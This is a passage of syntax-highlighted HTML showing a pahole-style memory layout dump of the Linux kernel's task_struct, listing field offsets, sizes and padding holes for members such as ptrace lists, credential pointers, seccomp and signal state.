</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">ptraced</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2544      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2544      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2552      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">ptrace_entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2560      |     8 */</span>    <span class="k">struct</span> <span class="n">pid</span> <span class="o">*</span><span class="n">thread_pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2568      |    64 */</span>    <span class="k">struct</span> <span class="n">hlist_node</span> <span class="n">pid_links</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2632      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2632      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2640      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">thread_group</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2648      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2648      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2656      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">thread_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2664      |     8 */</span>    <span class="k">struct</span> <span class="n">completion</span> <span class="o">*</span><span class="n">vfork_done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2672      |     8 */</span>    <span class="kt">int</span> <span class="o">*</span><span class="n">set_child_tid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2680      |     8 */</span>    <span class="kt">int</span> <span class="o">*</span><span class="n">clear_child_tid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2688      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">worker_private</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2696      |     8 */</span>    <span class="n">u64</span> <span class="n">utime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2704      |     8 */</span>    <span class="n">u64</span> <span class="n">stime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2712      |     8 */</span>    <span class="n">u64</span> <span class="n">gtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2720      |    24 */</span>    <span class="k">struct</span> <span class="n">prev_cputime</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2720      |     8 */</span>        <span class="n">u64</span> <span class="n">utime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2728      |     8 */</span>        <span class="n">u64</span> <span class="n">stime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2736      |     4 */</span>        <span class="kt">raw_spinlock_t</span> <span class="n">lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">prev_cputime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2744      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nvcsw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2752      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nivcsw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2760      |     8 */</span>    <span class="n">u64</span> <span class="n">start_time</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2768      |     8 */</span>    <span class="n">u64</span> <span class="n">start_boottime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2776      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">min_flt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2784      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">maj_flt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2792      |    80 */</span>    <span class="k">struct</span> <span class="n">posix_cputimers</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2792      |    72 */</span>        <span class="k">struct</span> <span class="n">posix_cputimer_base</span> <span class="n">bases</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2864      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">timers_active</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2868      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">expiry_active</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   80 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">posix_cputimers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2872      |    56 */</span>    <span class="k">struct</span> <span class="n">posix_cputimers_work</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2872      |    16 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2872      |     8 */</span>            <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2880      |     8 */</span>            <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2888      |    32 */</span>        <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2888      |     8 */</span>            <span class="kt">atomic_long_t</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2896      |     4 */</span>            <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2900      |     4 */</span>            <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2900      |     4 */</span>                <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2904      |    16 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2904      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2912      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2920      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">scheduled</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   56 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">posix_cputimers_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2928      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">ptracer_cred</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2936      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">real_cred</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2944      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">cred</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2952      |     8 */</span>    <span class="k">struct</span> <span class="n">key</span> <span class="o">*</span><span class="n">cached_requested_key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2960      |    16 */</span>    <span class="kt">char</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2976      |     8 */</span>    <span class="k">struct</span> <span class="n">nameidata</span> <span class="o">*</span><span class="n">nameidata</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2984      |     8 */</span>    <span class="k">struct</span> <span class="n">sysv_sem</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2984      |     8 */</span>        <span class="k">struct</span> <span class="n">sem_undo_list</span> <span class="o">*</span><span class="n">undo_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">sysvsem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2992      |    16 */</span>    <span class="k">struct</span> <span class="n">sysv_shm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2992      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2992      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3000      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">shm_clist</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">sysvshm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3008      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">last_switch_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3016      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">last_switch_time</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3024      |     8 */</span>    <span class="k">struct</span> <span class="n">fs_struct</span> <span class="o">*</span><span class="n">fs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3032      |     8 */</span>    <span class="k">struct</span> <span class="n">files_struct</span> <span class="o">*</span><span class="n">files</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3040      |     8 */</span>    <span class="k">struct</span> <span class="n">io_uring_task</span> <span class="o">*</span><span class="n">io_uring</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3048      |     8 */</span>    <span class="k">struct</span> <span class="n">nsproxy</span> <span class="o">*</span><span class="n">nsproxy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3056      |     8 */</span>    <span class="k">struct</span> <span class="n">signal_struct</span> <span class="o">*</span><span class="n">signal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3064      |     8 */</span>    <span class="k">struct</span> <span class="n">sighand_struct</span> <span class="o">*</span><span class="n">sighand</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3072      |     8 */</span>    <span class="kt">sigset_t</span> <span class="n">blocked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3080      |     8 */</span>    <span class="kt">sigset_t</span> <span class="n">real_blocked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3088      |     8 */</span>    <span class="kt">sigset_t</span> <span class="n">saved_sigmask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3096      |    24 */</span>    <span class="k">struct</span> <span class="n">sigpending</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3096      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3096      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3104      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3112      |     8 */</span>        <span class="kt">sigset_t</span> <span class="n">signal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pending</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3120      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sas_ss_sp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3128      |     8 */</span>    <span class="kt">size_t</span> <span class="n">sas_ss_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3136      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sas_ss_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3144      |     8 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">task_works</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3152      |     8 */</span>    <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">audit_context</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3160      |     4 */</span>    <span class="kt">kuid_t</span> <span class="n">loginuid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3164      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sessionid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3168      |    16 */</span>    <span class="k">struct</span> <span class="n">seccomp</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3168      |     4 */</span>        <span class="kt">int</span> <span class="n">mode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3172      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">filter_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3176      |     8 */</span>        <span class="k">struct</span> <span class="n">seccomp_filter</span> <span class="o">*</span><span class="n">filter</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">seccomp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3184      |    32 */</span>    <span class="k">struct</span> <span class="n">syscall_user_dispatch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3184      |     8 */</span>        <span class="kt">char</span> <span class="o">*</span><span class="n">selector</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3192      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3200      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3208      |     1 */</span>        <span class="kt">bool</span> <span class="n">on_dispatch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  7-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">syscall_dispatch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3216      |     8 */</span>    <span class="n">u64</span> <span class="n">parent_exec_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3224      |     8 */</span>    <span class="n">u64</span> <span class="n">self_exec_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3232      |     4 */</span>    <span class="kt">spinlock_t</span> <span class="n">alloc_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3236      |     4 */</span>    <span class="kt">raw_spinlock_t</span> <span class="n">pi_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3240      |     8 */</span>    <span class="k">struct</span> <span class="n">wake_q_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3240      |     8 */</span>        <span class="k">struct</span> <span class="n">wake_q_node</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">wake_q</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3248      |    16 */</span>    <span class="k">struct</span> <span class="n">rb_root_cached</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3248      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_root</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3248      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">rb_root</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3256      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_leftmost</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pi_waiters</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3264      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">pi_top_task</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3272      |     8 */</span>    <span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="o">*</span><span class="n">pi_blocked_on</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3280      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">in_ubsan</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3288      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">journal_info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3296      |     8 */</span>    <span class="k">struct</span> <span class="n">bio_list</span> <span class="o">*</span><span class="n">bio_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3304      |     8 */</span>    <span class="k">struct</span> <span class="n">blk_plug</span> <span class="o">*</span><span class="n">plug</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3312      |     8 */</span>    <span class="k">struct</span> <span class="n">reclaim_state</span> <span class="o">*</span><span class="n">reclaim_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3320      |     8 */</span>    <span class="k">struct</span> <span class="n">backing_dev_info</span> <span class="o">*</span><span class="n">backing_dev_info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3328      |     8 */</span>    <span class="k">struct</span> <span class="n">io_context</span> <span class="o">*</span><span class="n">io_context</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3336      |     8 */</span>    <span class="k">struct</span> <span class="n">capture_control</span> <span class="o">*</span><span class="n">capture_control</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3344      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptrace_message</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3352      |     8 */</span>    <span class="kt">kernel_siginfo_t</span> <span class="o">*</span><span class="n">last_siginfo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3360      |    56 */</span>    <span class="k">struct</span> <span class="n">task_io_accounting</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3360      |     8 */</span>        <span class="n">u64</span> <span class="n">rchar</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3368      |     8 */</span>        <span class="n">u64</span> <span class="n">wchar</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3376      |     8 */</span>        <span class="n">u64</span> <span class="n">syscr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3384      |     8 */</span>        <span class="n">u64</span> <span class="n">syscw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3392      |     8 */</span>        <span class="n">u64</span> <span class="n">read_bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3400      |     8 */</span>        <span class="n">u64</span> <span class="n">write_bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3408      |     8 */</span>        <span class="n">u64</span> <span class="n">cancelled_write_bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   56 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">ioac</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3416      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">psi_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3424      |     8 */</span>    <span class="n">u64</span> <span class="n">acct_rss_mem1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3432      |     8 */</span>    <span class="n">u64</span> <span class="n">acct_vm_mem1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3440      |     8 */</span>    <span class="n">u64</span> <span class="n">acct_timexpd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3448      |   128 */</span>    <span class="kt">nodemask_t</span> <span class="n">mems_allowed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3576      |     4 */</span>    <span class="kt">seqcount_spinlock_t</span> <span class="n">mems_allowed_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3580      |     4 */</span>    <span class="kt">int</span> <span class="n">cpuset_mem_spread_rotor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3584      |     4 */</span>    <span class="kt">int</span> <span class="n">cpuset_slab_spread_rotor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3592      |     8 */</span>    <span class="k">struct</span> <span class="n">css_set</span> <span class="o">*</span><span class="n">cgroups</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3600      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3600      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3608      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">cg_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3616      |     4 */</span>    <span class="n">u32</span> <span class="n">closid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3620      |     4 */</span>    <span class="n">u32</span> <span class="n">rmid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3624      |     8 */</span>    <span class="k">struct</span> <span class="n">robust_list_head</span> <span class="o">*</span><span class="n">robust_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3632      |     8 */</span>    <span class="k">struct</span> <span class="n">compat_robust_list_head</span> <span class="o">*</span><span class="n">compat_robust_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3640      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3640      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3648      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pi_state_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3656      |     8 */</span>    <span class="k">struct</span> <span class="n">futex_pi_state</span> <span class="o">*</span><span class="n">pi_state_cache</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3664      |    32 */</span>    <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3664      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">owner</span><span class="p">;</span>
